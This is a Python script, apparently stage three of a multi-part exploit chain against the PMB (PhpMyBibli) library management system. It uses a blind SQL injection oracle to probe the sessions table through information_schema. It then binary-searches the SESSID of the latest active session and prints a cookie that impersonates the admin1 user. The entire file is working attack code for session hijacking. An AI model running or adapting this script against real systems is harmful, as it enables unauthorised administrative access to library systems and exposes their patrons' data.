#!/usr/bin/env python3
"""Stage 3 — enumerate the PMB sessions table through the oracle.

Finds a live SESSID by binary search. Sessions churn, so a long search drifts;
the caller is expected to retry or to log in instead.

Usage:
  python 02_sessions.py
"""
import sys
import time

import common as c

sys.stdout.reconfigure(encoding="utf-8", errors="replace")


def candidate(max_age=300):
    """Binary-search the SESSID of the most recent session."""
    window = "FROM sessions WHERE LastOn > %d ORDER BY LastOn DESC LIMIT 0,1" % (
        int(time.time()) - max_age)
    if not c.Q("(SELECT SESSID %s) IS NOT NULL" % window):
        return None, window
    lo, hi = 1111111111, 9999999999
    while lo < hi:
        mid = (lo + hi) // 2
        if c.Q("CAST((SELECT SESSID %s) AS UNSIGNED) <= %d" % (window, mid)):
            hi = mid
        else:
            lo = mid + 1
    return lo, window


def main():
    c.out("[*] sessions table shape")
    c.out("    SESSID column   %s" % c.Q(
        "(SELECT COUNT(*) FROM information_schema.columns "
        "WHERE table_schema=DATABASE() AND table_name='sessions' AND column_name='SESSID') > 0"))
    c.out("    LastOn column   %s" % c.Q(
        "(SELECT COUNT(*) FROM information_schema.columns "
        "WHERE table_schema=DATABASE() AND table_name='sessions' AND column_name='LastOn') > 0"))
    c.out("    any rows        %s" % c.Q("(SELECT COUNT(*) FROM sessions) > 0"))

    c.out("\n[*] live session search")
    for attempt in range(3):
        sessid, window = candidate()
        if not sessid:
            c.out("    attempt %d: no recent session" % (attempt + 1))
            time.sleep(5)
            continue
        still = c.Q("CAST((SELECT SESSID %s) AS UNSIGNED) = %d" % (window, sessid))
        c.out("    attempt %d: SESSID=%d still_current=%s" % (attempt + 1, sessid, still))
        if still:
            c.out("\n[+] use with: Cookie: PhpMyBibli-SESSID=%d; PhpMyBibli-LOGIN=admin1" % sessid)
            return 0
    c.out("\n[!] no stable session — log in instead (03_login.py)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
